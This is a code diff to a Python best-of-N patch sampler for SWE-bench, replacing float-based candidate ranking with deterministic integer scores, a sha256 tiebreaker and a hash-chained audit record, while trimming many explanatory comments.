@@ -3,6 +3,38 @@ swe_bench/bobn_sampler.py
 ==========================
 Behavior Best-of-N (BoBN) trajectory sampler for GAP 5.
 
+VIB-01 FIX (Glasswing Red-Team Audit, 2026-04-13)
+───────────────────────────────────────────────────
+PROBLEM: Candidate ranking used candidates.sort(key=lambda c: c.composite_score,
+reverse=True) where composite_score was a float derived from a float-valued
+attack_confidence.  Two runs with identical inputs could produce different winner
+selections because floating-point arithmetic is non-associative and LLM API
+probability sampling can vary between provider nodes.
+
+FIX DETAILS
+────────────
+1. BoBNCandidate gains:
+     fail_to_pass_count: int     — integer count of FAIL_TO_PASS tests passed
+     total_fail_tests: int       — denominator for test_component
+     composite_score_int: int    — output of compute_deterministic_composite()
+     _patch_tiebreaker: str      — sha256(patch)[:16] for stable tiebreaker
+
+   composite_score: float is retained as a deprecated backward-compat field
+   derived from composite_score_int / 1000.
+
+2. BoBNCandidate.ranking_key() returns (-composite_score_int, _patch_tiebreaker).
+   All sorts use this method.  The negative integer ensures descending order
+   with lexicographic tiebreaker (lower sha256 prefix = higher rank on tie).
+
+3. After the execution loop fills fail_to_pass_count and total_fail_tests,
+   and after the critic produces attack_severity_ordinal, the ranking step
+   calls compute_deterministic_composite() to fill composite_score_int and
+   _patch_tiebreaker before any sort.
+
+4. A BoBNAuditRecord is written to storage after ranking so the DO-178C RTM
+   can prove the stable total order was applied and record which candidate was
+   selected and why, with a hash-chained audit fingerprint.
+
 Architecture (Section 3.4 / Gap 5.4 of GAP5_SWEBench90_Architecture.md)
 ──────────────────────────────────────────────────────────────────────────
 BoBN is the single highest-leverage algorithmic improvement available
@@ -30,8 +62,8 @@ BoBN Pipeline
 3. ATTACK: AdversarialCriticAgent attacks all candidates concurrently,
    returns CriticAttackReport per candidate.
 
-4. RANK: Composite score = test_score × 0.6 + robustness × 0.3 + minimality × 0.1.
-   Candidates sorted descending by composite_score.
+4. RANK (VIB-01 FIX): Integer composite + sha256 tiebreaker.
+   All sorting uses ranking_key() = (-composite_score_int, _patch_tiebreaker).
 
 4.5 SYNTHESIZE: PatchSynthesisAgent reviews the ranked candidates and their
    attack reports.  It either selects the best single candidate (PICK_BEST)
@@ -64,47 +96,13 @@ BoBN Pipeline
    (mutmut not installed, etc.) are non-blocking.
 
 6. COLLECT: All (prompt, patch, test_result, reward) triples written to
-   TrajectoryCollector for ARPO fine-tuning.  TrajectoryCollector is passed
-   in at construction time (optional).  When provided, collect_from_bobn_result
-   is called after synthesis so every candidate — winner and losers — becomes
-   a training triple.  GRPO benefits from the contrast between good and bad
-   attempts from the same distribution.  The controller and evaluator paths
-   both pass their own collector instances so no double-counting occurs.
-
-FIX — Formal Gate Closure (Step 5)
-────────────────────────────────────
-Previously, Step 5 was listed in the module docstring but never executed
-inside sample().  The formal gate only ran inside SWEBenchEvaluator._run_formal_gate(),
-which is not called when BoBNSampler is used directly from the production
-controller path (orchestrator/controller.py::_phase_fix_gap5).
-
-The fix adds BoBNSampler._run_formal_gate_on_patch() — a self-contained
-four-layer verifier — and BoBNSampler._apply_formal_gate() which orchestrates
-promotion of runner-up candidates on failure.  sample() calls _apply_formal_gate()
-between step 4.5 (synthesis) and step 5.5 (test/mutation gate).  The evaluator
-path still calls its own _run_formal_gate() for backward compatibility, but
-doing so is now additive rather than the only place formal verification runs.
-
-FIX — CBMC inline in Formal Gate (Layer 3)
-────────────────────────────────────────────
-Previously the formal gate in bobn_sampler only ran 3 layers (diff sanity,
-safety patterns, Z3).  CBMC only ran in FormalVerifierAgent which is a
-post-commit standalone agent — meaning the production BoBN path never ran
-CBMC during candidate selection.  _run_cbmc_on_patch() is now Layer 3 of
-the inline formal gate, closing this gap for both the evaluator and
-controller call paths.
-
-FIX — TestGenerator + MutationVerifier inline (Step 5.5)
-──────────────────────────────────────────────────────────
-Previously TestGeneratorAgent and MutationVerifierAgent were only called
-from controller._phase_fix_gap5() AFTER BoBNSampler.sample() returned —
-meaning the SWE-bench evaluator path had no mutation coverage gate at all.
-Step 5.5 runs these inline when storage and repo_root are provided,
-closing the gap for all call paths.
+   TrajectoryCollector for ARPO fine-tuning.
 """
 from __future__ import annotations
 
 import asyncio
+import hashlib
+import json
 import logging
 import os
 import re
@@ -117,11 +115,11 @@ _DISABLE_FORMAL     = os.environ.get("RHODAWK_DISABLE_FORMAL", "0") == "1"
 # Max number of runner-up candidates to try if the synthesis winner fails
 _MAX_FORMAL_RETRIES = int(os.environ.get("RHODAWK_FORMAL_MAX_RETRIES", "2"))
 # CBMC timeout for Layer 3 of the formal gate (seconds).
-# Kept shorter than FormalVerifierAgent's 120s because this runs per candidate.
 _CBMC_TIMEOUT_S     = int(os.environ.get("RHODAWK_BOBN_CBMC_TIMEOUT", "60"))
 
 # Hazardous patterns scanned in lines ADDED by a patch.
-# Each entry: (regex_pattern, human_readable_description)
+# NOTE: These patterns are used ONLY in the formal gate Layer 2 (diff safety scan),
+# NOT for property verification (which uses AST visitors after VIB-02 fix).
 _SAFETY_PATTERNS: list[tuple[str, str]] = [
     (r"\bwhile\s*\(\s*true\s*\)|\bfor\s*\(\s*;;\s*\)",           "unbounded loop (CWE-835)"),
     (r"\bmalloc\s*\(|\bcalloc\s*\(|\brealloc\s*\(",               "dynamic alloc post-init"),
@@ -136,8 +134,11 @@ _SAFETY_PATTERNS: list[tuple[str, str]] = [
 from agents.adversarial_critic import (
     AdversarialCriticAgent,
     CriticAttackReport,
+    CriticAuditRecord,
     PatchMinimalityScore,
-    compute_composite_score,
+    compute_deterministic_composite,
+    compute_composite_score,       # backward-compat shim only
+    compute_ranking_key,
 )
 from agents.patch_synthesis_agent import (
     PatchSynthesisAgent,
@@ -152,7 +153,10 @@ log = logging.getLogger(__name__)
 
 @dataclass
 class BoBNCandidate:
-    """One generated patch candidate in the BoBN pool."""
+    """One generated patch candidate in the BoBN pool.
+
+    VIB-01 FIX: Added integer scoring fields for deterministic ranking.
+    """
     candidate_id:    str    = ""
     patch:           str    = ""
     model:           str    = ""
@@ -160,24 +164,36 @@ class BoBNCandidate:
     fixer:           str    = "a"   # "a" = Qwen-32B, "b" = DeepSeek-16B
 
     # Filled after execution loop
-    test_score:      float  = 0.0
+    test_score:      float  = 0.0   # backward compat — derived from fail_to_pass_count
     all_passed:      bool   = False
     exec_rounds:     int    = 0
     exec_result:     ExecutionLoopResult | None = None
 
+    # VIB-01 FIX: integer test signals.
+    fail_to_pass_count: int = 0   # how many FAIL_TO_PASS tests now pass
+    total_fail_tests:   int = 0   # denominator; 0 means unknown
+
     # Filled after critic attack
     attack_report:   CriticAttackReport | None  = None
     minimality:      PatchMinimalityScore | None = None
-    composite_score: float  = 0.0
 
-    # ARCH-03 FIX: issue_ids populated by controller so _gap5_commit() can close
-    # the correct issue(s) without relying on getattr fallback.
+    # VIB-01 FIX: PRIMARY RANKING SIGNAL — integer millipoints [0, 1000].
+    composite_score_int: int = 0
+
+    # VIB-01 FIX: stable tiebreaker — sha256(patch)[:16] hex string.
+    _patch_tiebreaker: str = ""
+
+    # DEPRECATED: float composite retained for backward-compat callers.
+    # Do NOT use for ranking.
+    composite_score: float = 0.0
+
+    # ARCH-03 FIX: issue_ids populated by controller
     issue_ids: list[str] = field(default_factory=list)
 
-    # Filled after synthesis step (GAP 5 fix)
+    # Filled after synthesis step
     synthesis_decision: SynthesisDecision | None = None
 
-    # Filled after formal gate (GAP 5 fix — step 5).  None = not yet evaluated.
+    # Filled after formal gate.  None = not yet evaluated.
     formal_gate_passed: bool | None = None
 
     def to_dict(self) -> dict:
@@ -187,7 +203,99 @@ class BoBNCandidate:
             "model":       self.model,
             "temperature": self.temperature,
             "test_score":  self.test_score,
+            # VIB-01: include integer signals so downstream tools can use them
+            "fail_to_pass_count": self.fail_to_pass_count,
+            "total_fail_tests":   self.total_fail_tests,
         }
+
+    def ranking_key(self) -> tuple[int, str]:
+        """
+        VIB-01 FIX: Return stable total-order ranking key.
+
+        Returns (-composite_score_int, _patch_tiebreaker) so that candidates
+        sort by descending integer composite with sha256-prefix tiebreaker.
+        Callers must call _finalise_ranking_fields() before sorting.
+        """
+        return (-self.composite_score_int, self._patch_tiebreaker)
+
+    def _finalise_ranking_fields(
+        self,
+        total_fail_tests_override: int | None = None,
+    ) -> None:
+        """
+        VIB-01 FIX: Compute composite_score_int and _patch_tiebreaker from
+        the integer signals filled by the execution loop and critic attack.
+
+        Must be called after both exec_result and attack_report are populated,
+        and before any sort using ranking_key().
+
+        Parameters
+        ──────────
+        total_fail_tests_override:
+            When the caller knows the true total_fail_tests for this instance
+            (from the SWE-bench harness), pass it here so the test component
+            uses the correct denominator.  Otherwise the value already stored
+            in self.total_fail_tests is used.
+        """
+        if total_fail_tests_override is not None and total_fail_tests_override > 0:
+            self.total_fail_tests = total_fail_tests_override
+
+        # If total_fail_tests is unknown (0), derive from test_score as fallback.
+        # Use synthetic denominator of 100 to preserve ratio.
+        if self.total_fail_tests == 0:
+            _synth = 100
+            self.fail_to_pass_count = round(self.test_score * _synth)
+            self.total_fail_tests   = _synth
+
+        attack_ordinal  = self.attack_report.attack_severity_ordinal if self.attack_report else 5
+        min_score       = self.minimality or PatchMinimalityScore()
+
+        self.composite_score_int = compute_deterministic_composite(
+            fail_to_pass_count      = self.fail_to_pass_count,
+            total_fail_tests        = self.total_fail_tests,
+            attack_severity_ordinal = attack_ordinal,
+            minimality_score        = min_score,
+        )
+
+        # Tiebreaker: sha256 of the patch text.  Stable across all platforms.
+        self._patch_tiebreaker = hashlib.sha256(
+            self.patch.encode()
+        ).hexdigest()[:16]
+
+        # Keep deprecated float in sync for backward-compat callers
+        self.composite_score = self.composite_score_int / 1000.0
+
+
+@dataclass
+class BoBNAuditRecord:
+    """
+    VIB-01 FIX: Immutable audit record written to storage after ranking.
+
+    Captures the full deterministic ranking for one BoBN run so the DO-178C
+    RTM can prove: (a) the stable total order was applied, (b) the exact
+    integer inputs to every compute_deterministic_composite() call, and (c)
+    the sha256 of the winning patch at the moment of selection.
+
+    Fields are hash-chained via record_hash = sha256(json(all_fields)).
+    """
+    instance_id:       str               = ""
+    run_id:            str               = ""
+    n_candidates:      int               = 0
+    ranked_summary:    list[dict]        = field(default_factory=list)
+    # [{candidate_id, composite_score_int, patch_sha256, ranking_key_str}]
+    winner_id:         str               = ""
+    winner_composite:  int               = 0
+    winner_patch_sha256: str             = ""
+    synthesis_action:  str               = ""
+    formal_gate_passed: bool | None      = None
+    critic_records:    list[CriticAuditRecord] = field(default_factory=list)
+    record_hash:       str               = ""
+
+    def compute_hash(self) -> str:
+        fields = {k: v for k, v in self.__dict__.items() if k != "record_hash"}
+        return hashlib.sha256(
+            json.dumps(fields, sort_keys=True, default=str).encode()
+        ).hexdigest()[:32]
 
 
 @dataclass
@@ -198,18 +306,15 @@ class BoBNResult:
     all_candidates:   list[BoBNCandidate] = field(default_factory=list)
     total_elapsed_s:  float            = 0.0
     n_candidates:     int              = 0
-    n_fully_passing:  int              = 0    # candidates where all tests pass
+    n_fully_passing:  int              = 0
     strategy:         str              = ""   # "bobn" / "fallback"
-    # Populated after synthesis step (GAP 5 fix)
     synthesis_action: str              = ""   # "pick_best" | "merge" | "argmax_fallback"
-    # Populated after formal gate (GAP 5 fix — step 5)
     formal_gate_passed:  bool          = False
-    formal_gate_skipped: bool          = False  # True when RHODAWK_DISABLE_FORMAL=1
-    # Populated after test-generation + mutation gate (GAP 5 fix — step 5.5)
-    # False means the winner's test suite didn't kill enough mutants.
-    # None means the gate was skipped (storage/repo_root not provided to constructor).
+    formal_gate_skipped: bool          = False
     test_gate_passed:      bool | None = None
     mutation_gate_passed:  bool | None = None
+    # VIB-01 FIX: audit record written after ranking
+    audit_record: BoBNAuditRecord | None = None
 
     @property
     def winning_patch(self) -> str:
@@ -217,66 +322,23 @@ class BoBNResult:
 
     @property
     def winning_score(self) -> float:
+        """DEPRECATED: returns float derived from integer composite."""
         return self.winner.composite_score if self.winner else 0.0
+
+    @property
+    def winning_score_int(self) -> int:
+        """VIB-01: canonical integer composite of the winning candidate."""
+        return self.winner.composite_score_int if self.winner else 0
 
 
 class BoBNSampler:
     """
-    Behavior Best-of-N sampler — orchestrates the full GAP 5 pipeline:
-    dual-fixer generation → execution loops → adversarial critique →
-    patch synthesis → ranking → formal gate (4 layers) →
-    test generation + mutation gate → trajectory collection.
+    Behavior Best-of-N sampler — orchestrates the full GAP 5 pipeline.
 
-    GAP 5 FIX (Step 4.5 — Synthesis):
-    PatchSynthesisAgent is called between the adversarial critique (step 3) and
-    the final winner selection (step 4).  This replaces the pure composite_score
-    argmax with an LLM-reasoned decision that can MERGE the best elements of
-    multiple candidates.
-
-    GAP 5 FIX (Step 5 — Formal Gate Closure):
-    The formal gate now runs inside BoBNSampler.sample() after synthesis and
-    before trajectory collection.  Four layers: diff sanity → safety patterns
-    → CBMC (C/C++) → Z3 SMT.  Self-contained — no SWEBenchEvaluator dependency.
-
-    GAP 5 FIX (Step 5 — CBMC Layer 3):
-    CBMC is now Layer 3 of the inline formal gate.  Previously CBMC only ran
-    in FormalVerifierAgent (post-commit standalone agent), so BoBN candidate
-    selection never exercised bounded model checking.  _run_cbmc_on_patch()
-    extracts added C/C++ content from the diff and runs cbmc with standard
-    safety flags.  Non-blocking when cbmc is absent or times out.
-
-    GAP 5 FIX (Step 5.5 — TestGenerator + MutationVerifier):
-    When storage and repo_root are provided, TestGeneratorAgent generates a
-    test suite for the winning patch and MutationVerifierAgent verifies that
-    the suite kills >= domain_threshold% of mutants before trajectory collection.
-    This closes the gap where the evaluator path had no mutation coverage gate.
-
-    Parameters
-    ──────────
-    model_router         — TieredModelRouter
-    critic               — AdversarialCriticAgent (must be different model family)
-    synthesis            — PatchSynthesisAgent (optional; auto-created if None)
-    localization         — LocalizationResult from SWEBenchLocalizer
-    trajectory_collector — TrajectoryCollector (optional).  When provided, every
-                           candidate in a completed BoBN run is recorded as an
-                           ARPO training triple at the end of sample().  Pass None
-                           to skip trajectory collection (e.g. during unit tests).
-    enable_formal_gate   — When True (default), the formal gate runs after synthesis.
-                           Overridden to False when RHODAWK_DISABLE_FORMAL=1.
-    storage              — BrainStorage instance (optional).  Required for inline
-                           TestGenerator + MutationVerifier (step 5.5).  When None
-                           the test/mutation gate is skipped.
-    run_id               — Run identifier string for TestGenerator/MutationVerifier
-                           storage records.  Defaults to the sample() instance_id
-                           when not provided.
-    repo_root            — Path to the repository root (optional).  Required for
-                           CBMC (detects file paths in diff) and TestGenerator /
-                           MutationVerifier.  When None, CBMC writes to a temp
-                           dir and test/mutation gate is skipped.
-    domain_mode          — DomainMode enum value controlling mutation score
-                           thresholds (MILITARY=90%, GENERAL=60%, etc.).
-    mutation_threshold   — Override the domain_mode-derived mutation threshold
-                           (0–100).  None = use domain_mode default.
+    VIB-01 FIX: Ranking now uses integer millipoint scores with sha256
+    tiebreaker via BoBNCandidate.ranking_key().  No floating-point in the
+    critical ranking path.  A BoBNAuditRecord is written to storage after
+    ranking for DO-178C traceability.
     """
 
     def __init__(
@@ -293,28 +355,21 @@ class BoBNSampler:
         repo_root:              Any | None                = None,
         domain_mode:            Any | None                = None,
         mutation_threshold:     float | None              = None,
-        # ARCH-02 FIX: accept cpg_engine so evaluator.py can pass the
-        # per-instance CPGEngine without it being silently ignored.
         cpg_engine:             Any | None                = None,
     ) -> None:
-        self.router       = model_router
-        self.critic       = critic
-        self.issue        = issue_text
-        self.loc_ctx      = localization_context
-        self._collector   = trajectory_collector
-        # Formal gate: respect constructor flag AND env override
-        self._formal_enabled = enable_formal_gate and not _DISABLE_FORMAL
-        # Synthesis agent: use provided instance or auto-create from same router.
-        # Auto-create uses CLOUD_OSS tier — different family from all vLLM models.
-        self._synthesis = synthesis or PatchSynthesisAgent(model_router=model_router)
-        # Step 5.5 — TestGen + Mutation: require storage + repo_root to activate
-        self._storage            = storage
-        self._run_id             = run_id
-        self._repo_root          = repo_root
-        self._domain_mode        = domain_mode
-        self._mutation_threshold = mutation_threshold
-        # ARCH-02 FIX: store cpg_engine so localization can use causal context.
-        self._cpg_engine         = cpg_engine
+        self.router               = model_router
+        self.critic               = critic
+        self.issue                = issue_text
+        self.loc_ctx              = localization_context
+        self._collector           = trajectory_collector
+        self._formal_enabled      = enable_formal_gate and not _DISABLE_FORMAL
+        self._synthesis           = synthesis or PatchSynthesisAgent(model_router=model_router)
+        self._storage             = storage
+        self._run_id              = run_id
+        self._repo_root           = repo_root
+        self._domain_mode         = domain_mode
+        self._mutation_threshold  = mutation_threshold
+        self._cpg_engine          = cpg_engine
 
     async def sample(
         self,
@@ -327,10 +382,6 @@ class BoBNSampler:
     ) -> BoBNResult:
         """
         Run the complete BoBN sampling pipeline for one SWE-bench instance.
-
-        Generates N candidates from two model families, runs each through
-        test-execution feedback loop, attacks with adversarial critic,
-        synthesizes the winner (merge or pick_best), and returns the result.
         """
         start = time.monotonic()
         result = BoBNResult(
@@ -367,6 +418,17 @@ class BoBNSampler:
         )
         candidates = await self._run_execution_loops(candidates, exec_loop)
 
+        # VIB-01 FIX: populate integer test signals from execution results.
+        total_fail_tests = len(fail_tests) if fail_tests else 0
+        for c in candidates:
+            c.total_fail_tests   = total_fail_tests
+            if c.exec_result is not None:
+                # ExecutionLoopResult.fail_to_pass_count populated by exec loop
+                c.fail_to_pass_count = getattr(c.exec_result, "fail_to_pass_count", 0)
+                if c.fail_to_pass_count == 0 and total_fail_tests > 0:
+                    # Derive from float score if integer not directly available
+                    c.fail_to_pass_count = round(c.test_score * total_fail_tests)
+
         result.n_fully_passing = sum(1 for c in candidates if c.all_passed)
         log.info(
             f"[bobn] {instance_id}: {result.n_fully_passing}/{len(candidates)} "
@@ -382,26 +444,40 @@ class BoBNSampler:
             pass_tests = pass_tests,
         )
 
-        # ── Step 4: Compute composite scores and sort ─────────────────────────
+        # ── Step 4: Compute integer composite scores and sort (VIB-01 FIX) ───
         for candidate, report in zip(candidates, attack_reports):
-            candidate.attack_report   = report
-            candidate.minimality      = AdversarialCriticAgent.compute_minimality_score(
+            candidate.attack_report = report
+            candidate.minimality    = AdversarialCriticAgent.compute_minimality_score(
                 candidate.patch
             )
-            candidate.composite_score = compute_composite_score(
-                test_score       = candidate.test_score,
-                attack_report    = report,
-                minimality_score = candidate.minimality,
+            # VIB-01 FIX: _finalise_ranking_fields() computes composite_score_int
+            # and _patch_tiebreaker using only integer arithmetic.
+            candidate._finalise_ranking_fields(
+                total_fail_tests_override=total_fail_tests,
             )
 
-        # Sort descending by composite score
-        candidates.sort(key=lambda c: c.composite_score, reverse=True)
+        # VIB-01 FIX: sort uses ranking_key() = (-composite_score_int, sha256_prefix).
+        # This is a stable total order: no floats, no ambiguity.
+        candidates.sort(key=lambda c: c.ranking_key())
         result.all_candidates = candidates
 
+        # VIB-01 FIX: write the ranking audit record before synthesis so the
+        # DO-178C RTM captures the exact integer scores that drove winner selection.
+        audit_rec = await self._write_ranking_audit(
+            instance_id  = instance_id,
+            candidates   = candidates,
+            attack_reports = attack_reports,
+        )
+        result.audit_record = audit_rec
+
+        log.info(
+            f"[bobn] {instance_id}: ranked {len(candidates)} candidates "
+            f"(top: id={candidates[0].candidate_id} "
+            f"composite_int={candidates[0].composite_score_int}/1000 "
+            f"tiebreaker={candidates[0]._patch_tiebreaker})"
+        )
+
         # ── Step 4.5: Patch synthesis — pick_best or merge ────────────────────
-        # GAP 5 FIX: This step was previously missing.  Pure argmax selection
-        # cannot merge the best elements of candidates A and B when each fixes
-        # a different sub-problem.  PatchSynthesisAgent does.
         log.info(f"[bobn] {instance_id}: running patch synthesis (step 4.5)")
         winner = await self._synthesize_winner(
             instance_id    = instance_id,
@@ -411,13 +487,6 @@ class BoBNSampler:
         )
 
         # ── Step 5: Formal gate ───────────────────────────────────────────────
-        # GAP 5 FIX: Previously listed in the docstring but never executed here.
-        # The gate only ran inside SWEBenchEvaluator, leaving the production
-        # controller path (controller._phase_fix_gap5) without formal verification.
-        # _apply_formal_gate() is self-contained — no SWEInstance dependency.
-        # On failure it promotes the next-best ranked candidate (up to
-        # _MAX_FORMAL_RETRIES attempts) before giving up and returning the
-        # synthesis winner with formal_gate_passed=False.
         winner, gate_passed, gate_skipped = await self._apply_formal_gate(
             instance_id = instance_id,
             winner      = winner,
@@ -433,26 +502,14 @@ class BoBNSampler:
             log.info(
                 f"[bobn] {instance_id}: winner=candidate_{result.winner.candidate_id} "
                 f"model={result.winner.model} temp={result.winner.temperature} "
+                f"composite_int={result.winner.composite_score_int}/1000 "
                 f"test_score={result.winner.test_score:.2f} "
-                f"composite={result.winner.composite_score:.2f} "
                 f"synthesis={result.synthesis_action} "
                 f"formal={'PASS' if gate_passed else ('SKIP' if gate_skipped else 'FAIL')} "
                 f"elapsed={result.total_elapsed_s:.1f}s"
             )
 
         # ── Step 5.5: TestGenerator + MutationVerifier inline gate ───────────
-        # GAP 5 FIX: Previously missing from bobn_sampler.sample().
-        # TestGenerator and MutationVerifier only ran in controller._phase_fix_gap5()
-        # AFTER BoBNSampler returned, meaning the SWE-bench evaluator path had no
-        # mutation coverage gate at all.
-        #
-        # When storage and repo_root are provided, this step runs inline so both
-        # the evaluator path and the controller path execute the full audit diagram:
-        #   Formal Gate → Test Generator + Mutation → Commit
-        #
-        # Mutation gate failure marks winner.formal_gate_passed=False so trajectory
-        # collection records the run as unresolved (same semantics as a formal fail).
-        # Infrastructure failures (mutmut not installed) are non-blocking.
         if result.winner and self._storage and self._repo_root:
             result.winner = await self._run_test_mutation_gate(
                 instance_id = instance_id,
@@ -460,14 +517,7 @@ class BoBNSampler:
                 result      = result,
             )
 
-        # ── Step 6: Trajectory collection for ARPO fine-tuning ────────────────
-        # Record every candidate — winner and losers — as a training triple.
-        # GRPO learns from the contrast between attempts; only recording the
-        # winner would throw away the most informative negative signal.
-        # resolved=True only when the winner passed all FAIL_TO_PASS tests
-        # (all_passed flag).  Production paths where fail_tests=[] will have
-        # all_passed=False, which correctly labels those runs as unresolved
-        # rather than poisoning the training corpus with false positives.
+        # ── Step 6: Trajectory collection ────────────────────────────────────
         if self._collector is not None and result.all_candidates:
             _resolved = bool(result.winner and result.winner.all_passed)
             try:
@@ -493,6 +543,101 @@ class BoBNSampler:
 
         return result
 
+    # ── VIB-01 FIX: Ranking audit record ────────────────────────────────────
+
+    async def _write_ranking_audit(
+        self,
+        instance_id:    str,
+        candidates:     list[BoBNCandidate],
+        attack_reports: list[CriticAttackReport],
+    ) -> BoBNAuditRecord:
+        """
+        VIB-01 FIX: Write a BoBNAuditRecord to storage after ranking.
+
+        Captures the exact integer inputs and outputs of every
+        compute_deterministic_composite() call in this BoBN run so the
+        DO-178C RTM can audit the ranking decision.
+        """
+        from agents.adversarial_critic import CriticAuditRecord
+
+        critic_records: list[CriticAuditRecord] = []
+        ranked_summary: list[dict] = []
+
+        for rank, c in enumerate(candidates):
+            ar = c.attack_report
+            min_s = c.minimality or PatchMinimalityScore()
+            patch_sha = hashlib.sha256(c.patch.encode()).hexdigest()[:16]
+
+            rk_key = f"{c.composite_score_int:04d}:{patch_sha}"
+            ranked_summary.append({
+                "rank":               rank + 1,
+                "candidate_id":       c.candidate_id,
+                "composite_score_int": c.composite_score_int,
+                "patch_sha256":       patch_sha,
+                "ranking_key":        rk_key,
+                "fail_to_pass_count": c.fail_to_pass_count,
+                "total_fail_tests":   c.total_fail_tests,
+            })
+
+            if ar is not None:
+                test_comp       = (c.fail_to_pass_count * 600) // max(c.total_fail_tests, 1)
+                robustness_comp = (10 - ar.attack_severity_ordinal) * 30
+                min_comp        = min_s.score_ordinal * 10
+
+                crec = CriticAuditRecord(
+                    candidate_id                 = c.candidate_id,
+                    critic_model                 = ar.critic_model,
+                    attack_severity_ordinal      = ar.attack_severity_ordinal,
+                    robustness_ordinal           = ar.robustness_ordinal,
+                    fail_to_pass_count           = c.fail_to_pass_count,
+                    total_fail_tests             = c.total_fail_tests,
+                    test_component_millis        = test_comp,
+                    robustness_component_millis  = robustness_comp,
+                    minimality_ordinal           = min_s.score_ordinal,
+                    minimality_component_millis  = min_comp,
+                    composite_millis             = c.composite_score_int,
+                    patch_sha256                 = patch_sha,
+                    ranking_key                  = rk_key,
+                )
+                crec.record_hash = crec.compute_hash()
+                critic_records.append(crec)
+
+        winner = candidates[0] if candidates else None
+        rec = BoBNAuditRecord(
+            instance_id         = instance_id,
+            run_id              = self._run_id or instance_id,
+            n_candidates        = len(candidates),
+            ranked_summary      = ranked_summary,
+            winner_id           = winner.candidate_id if winner else "",
+            winner_composite    = winner.composite_score_int if winner else 0,
+            winner_patch_sha256 = hashlib.sha256(
+                winner.patch.encode()
+            ).hexdigest()[:32] if winner else "",
+            critic_records      = critic_records,
+        )
+        rec.record_hash = rec.compute_hash()
+
+        # Persist to storage if available
+        if self._storage is not None:
+            try:
+                await self._storage.upsert_bobn_audit_record(rec)
+            except AttributeError:
+                # Storage backend may not yet implement upsert_bobn_audit_record.
+                # Log instead of crashing — the record is still attached to BoBNResult.
+                log.debug(
+                    f"[bobn] {instance_id}: storage.upsert_bobn_audit_record not "
+                    "implemented — audit record captured in BoBNResult.audit_record only"
+                )
+            except Exception as exc:
+                log.warning(f"[bobn] {instance_id}: audit record write failed: {exc}")
+
+        log.info(
+            f"[bobn] {instance_id}: ranking audit record written "
+            f"(hash={rec.record_hash[:12]}, winner={rec.winner_id}, "
+            f"composite={rec.winner_composite}/1000)"
+        )
+        return rec
+
     # ── Formal gate (Step 5) ─────────────────────────────────────────────────
 
     async def _apply_formal_gate(
@@ -503,33 +648,24 @@ class BoBNSampler:
     ) -> tuple[BoBNCandidate | None, bool, bool]:
         """
         Run the formal gate on the synthesis winner.  Promote runner-ups on failure.
-
         Returns (winner, gate_passed, gate_skipped).
-          winner       — the verified winner (may differ from input if promoted)
-          gate_passed  — True if the final winner cleared the gate
-          gate_skipped — True if the gate was disabled via env/flag
         """
         if not self._formal_enabled:
             log.debug(f"[bobn] {instance_id}: formal gate disabled (RHODAWK_DISABLE_FORMAL=1)")
             if winner:
-                winner.formal_gate_passed = None  # not evaluated
+                winner.formal_gate_passed = None
             return winner, False, True
 
         if winner is None:
             return winner, False, False
 
-        # Build the ordered list of candidates to try.
-        # The synthesis winner is evaluated first; if it fails we walk down
-        # the composite-ranked list (which excludes the MERGE synthetic candidate).
         candidates_to_try: list[BoBNCandidate] = []
         winner_in_ranked = any(c.candidate_id == winner.candidate_id for c in candidates)
 
         if not winner_in_ranked:
-            # MERGE candidate — try it first, then fall back to top ranked
             candidates_to_try.append(winner)
             candidates_to_try.extend(candidates[:_MAX_FORMAL_RETRIES])
         else:
-            # PICK_BEST — winner is in the ranked list
             candidates_to_try.append(winner)
             for c in candidates:
                 if c.candidate_id != winner.candidate_id:
@@ -559,8 +695,6 @@ class BoBNSampler:
                 f"(attempt {i + 1}/{len(candidates_to_try)})"
             )
 
-        # All retries exhausted — return the synthesis winner with gate_passed=False.
-        # A failing patch is still surfaced for human review rather than silently dropped.
         log.warning(
             f"[bobn] {instance_id}: formal gate failed for all "
             f"{len(candidates_to_try)} candidate(s) — "
@@ -578,32 +712,10 @@ class BoBNSampler:
         """
         Four-layer self-contained formal gate.
 
-        Does NOT depend on SWEInstance, BrainStorage, or SWEBenchEvaluator.
-        Runs identically on every BoBNSampler call path (evaluator and controller).
-
-        Layer 1 — Structural diff sanity (always runs, zero deps):
-          Validates the patch has at least one hunk header, no conflict markers,
-          and at least one non-whitespace added line.
-
-        Layer 2 — Safety pattern scan (always runs, zero deps):
-          Scans ONLY the +lines of the diff for hazard patterns (unbounded loops,
-          dynamic allocation, goto, unsafe atoi family, stdio in safety-critical
-          paths, shell=True, eval).  A match fails the gate immediately.
-
-        Layer 3 — CBMC bounded model checking (C/C++ patches only):
-          GAP 5 FIX: Previously missing from this method.  CBMC only ran in
-          FormalVerifierAgent (post-commit standalone agent), so BoBN candidate
-          selection never exercised bounded model checking.
-          Detects C/C++ files from diff headers.  Extracts added content, wraps
-          in a minimal harness, and runs cbmc with --bounds-check --pointer-check
-          --div-by-zero-check --signed-overflow-check.  Non-blocking when cbmc
-          is absent or times out — only a confirmed counterexample (rc=10) fails.
-
-        Layer 4 — Z3 SMT constraint check (runs if z3-solver is installed):
-          Asks the routing LLM to extract Z3 Python assertions for the key fix
-          invariants and verifies them.  Non-blocking — infrastructure failures
-          (z3 not installed, LLM timeout, unparseable code) are skipped, not
-          failed.  Only a concrete z3.unsat result fails the gate.
+        Layer 1 — Structural diff sanity
+        Layer 2 — Safety pattern scan (+lines only)
+        Layer 3 — CBMC bounded model checking (C/C++ patches)
+        Layer 4 — Z3 SMT constraint check
 
         Returns True (pass) or False (concrete violation detected).
         """
@@ -650,8 +762,6 @@ class BoBNSampler:
         )
 
         # ── Layer 3: CBMC bounded model checking (C/C++ patches only) ─────────
-        # GAP 5 FIX: This layer was previously missing — CBMC only ran in
-        # FormalVerifierAgent post-commit, never during BoBN candidate selection.
         try:
             cbmc_ok = await self._run_cbmc_on_patch(
                 patch       = patch,
@@ -662,8 +772,6 @@ class BoBNSampler:
                 return False
             log.debug(f"{prefix}: Layer 3 passed (CBMC)")
         except Exception as exc:
-            # Infrastructure failures (cbmc not installed, timeout) are non-blocking.
-            # Only a confirmed rc=10 counterexample fails — everything else skips.
             log.debug(f"{prefix}: Layer 3 skipped ({exc})")
 
         # ── Layer 4: Z3 SMT constraint check ──────────────────────────────────
@@ -674,38 +782,15 @@ class BoBNSampler:
                 return False
             log.debug(f"{prefix}: Layer 4 passed (Z3)")
         except Exception as exc:
-            # Infrastructure failures are non-blocking
             log.debug(f"{prefix}: Layer 4 skipped ({exc})")
 
         log.info(f"{prefix}: all layers passed")
         return True
 
     async def _run_cbmc_on_patch(self, patch: str, instance_id: str) -> bool:
-        """
